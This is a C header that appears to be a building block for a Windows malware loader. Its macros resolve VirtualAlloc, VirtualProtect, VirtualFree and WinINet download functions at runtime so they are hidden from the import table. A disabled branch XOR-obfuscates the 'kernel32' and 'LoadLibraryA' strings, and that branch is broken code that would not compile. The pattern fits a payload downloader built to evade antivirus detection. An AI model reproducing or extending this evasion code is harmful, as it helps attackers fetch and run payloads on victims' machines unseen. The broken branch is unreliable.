#pragma once
#include <stdio.h>
#include <windows.h>


typedef LPVOID HINTERNET;
#define INTERNET_OPEN_TYPE_DIRECT 1
#define INTERNET_FLAG_RELOAD 0x80000000

static void DecodeXor(char* in, size_t len, char key) {
  
    for (size_t i = 0; i < len; i++)
    {
        in[i] ^= key;
    }
}

#if 1
#define HLoadLibrary LoadLibraryA
#else
static const char* str_kernel32 =
    DecodeXor({0x2a, 0x24, 0x33, 0x2f, 0x24, 0x2d, 0x72, 0x73, 0x6f, 0x25, 0x2d,
               0x2d, 0x00},
              'A')
        .data();
static const char* str_loadlibrary =
    DecodeXor({0x0d, 0x2e, 0x20, 0x25, 0x0d, 0x28, 0x23, 0x33, 0x20, 0x33, 0x38,
               0x00},
              'A')
        .data();

static HMODULE HideLoadLibrary(LPCSTR lpModuleName) {
  HMODULE hModule = GetModuleHandleA(str_kernel32);
  return ((HMODULE(*)(LPCSTR))GetProcAddress(hModule, str_loadlibrary))(
      lpModuleName);
}
#define HLoadLibrary HideLoadLibrary
#endif

#define HIDE_FUNCTION(modName, funcName, funcRet, funcSignV, funcSign,         \
                      funcParam, funcErr)                                      \
  static funcRet hide_##funcName funcSignV {                                   \
    HMODULE hModule = GetModuleHandleA(modName);                               \
    if (hModule == NULL) hModule = HLoadLibrary(modName);                      \
    if (hModule == NULL) return funcErr;                                       \
    return ((funcRet(*) funcSign)GetProcAddress(hModule, #funcName))funcParam; \
  }

HIDE_FUNCTION("kernel32.dll", VirtualProtect, BOOL,
              (LPVOID l, SIZE_T s, DWORD d, PDWORD pd),
              (LPVOID, SIZE_T, DWORD, PDWORD), (l, s, d, pd), FALSE)
HIDE_FUNCTION("kernel32.dll", VirtualAlloc, LPVOID,
              (LPVOID l, SIZE_T s, DWORD d0, DWORD d1),
              (LPVOID, SIZE_T, DWORD, DWORD), (l, s, d0, d1), NULL);
HIDE_FUNCTION("kernel32.dll", VirtualFree, BOOL, (LPVOID l, SIZE_T s, DWORD d),
              (LPVOID, SIZE_T, DWORD), (l, s, d), FALSE);

HIDE_FUNCTION("wininet.dll", InternetOpenA, HINTERNET,
              (LPCSTR l0, DWORD d0, LPCSTR l1, LPCSTR l2, DWORD d1),
              (LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD), (l0, d0, l1, l2, d1),
              NULL);
HIDE_FUNCTION("wininet.dll", InternetCloseHandle, BOOL, (HINTERNET h),
              (HINTERNET), (h), FALSE);
HIDE_FUNCTION("wininet.dll", InternetReadFile, BOOL,
              (HINTERNET h, LPVOID l, DWORD d0, LPDWORD d1),
              (HINTERNET, LPVOID, DWORD, LPDWORD), (h, l, d0, d1), FALSE);
HIDE_FUNCTION("wininet.dll", InternetOpenUrlA, HINTERNET,
              (HINTERNET h, LPCSTR l0, LPCSTR l1, DWORD d0, DWORD d1,
               DWORD_PTR dp),
              (HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR),
              (h, l0, l1, d0, d1, dp), NULL);
